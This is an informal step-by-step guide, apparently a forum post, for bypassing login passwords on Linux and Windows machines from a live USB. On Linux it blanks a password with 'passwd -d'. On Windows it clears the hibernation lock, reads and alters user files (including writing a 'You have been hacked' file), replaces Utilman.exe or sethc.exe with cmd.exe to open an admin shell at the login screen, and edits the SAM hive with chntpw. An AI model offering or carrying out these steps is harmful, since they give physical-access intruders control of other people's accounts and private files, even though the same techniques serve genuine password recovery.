For linux

Boot from USB with (for example) debian live. Open terminal (ctrl+alt+t).

sudo su -
fdisk -l
If disk is already mounted (e.g., in other locations), umount it (right click) from GUI file manager.
mount /dev/diskname /mnt/
chroot /mnt/
passwd -d USERNAME

For windows

Boot from USB with (for example) debian live. Open terminal.

sudo su - (IMHO, it is better than sudo su without -)
fdisk -l (or if command not found /sbin/fdisk -l)
If disk with windows is in file manager (e.g., in other locations), umount it (right click from GUI).
mount /dev/yourdisknamefromfdisk /mnt/
Windows is hibernated, could not read-write, try read-only.
ntfsfix /dev/diskname
Windows is still hibernated.
umount /mnt/
ntfs-3g -o remove_hiberfile /dev/diskname /mnt/
(ntfs-3g is smart mount; you can check that now you have got read access: umount and mount again)

So, now you have full (read-write) access to disk with windows.
For example, you can edit desktop files:
cd mnt/Users/USERNAME/Desktop
ls -la
cat very_secret_file.txt
echo "You have been hacked" > hahaha.txt
nano filename.txt (ctrl+X and y for save and exit)

1st variant to reset password (open cmd by replacing another exe file):
cd /mnt/Windows/System32
mv Utilman.exe Utilman_copy.exe
cp cmd.exe Utilman.exe
(or do same commands with sethc.exe instead of Utilman.exe)
Now shut down and boot windows.
On login screen in the bottom right corner push special abilities button near poweroff.
(or quickly press shift 5 times if you replace sethc.exe)
Cmd with admin privileges must be opened, write there:
net user USERNAME NEWPASSWORD
For blank password write:
net user USERNAME ""
To restore original Utilman.exe (or sethc.exe) delete Utilman.exe and rename Utilman_copy.exe to Utilman.exe;
you can do it from windows, or again boot from debian live, mount, cd,
rm Utilman.exe
mv Utilman_copy.exe Utilman.exe

2nd variant (need internet connection for downloading special utility):
cd /mnt/Windows/System32/config
apt-get install chntpw
chntpw -l SAM (it is just list of all users to find USERNAME)
chntpw -u USERNAME SAM
In interactive mode:
1 (enter)
q (enter)
y (enter)
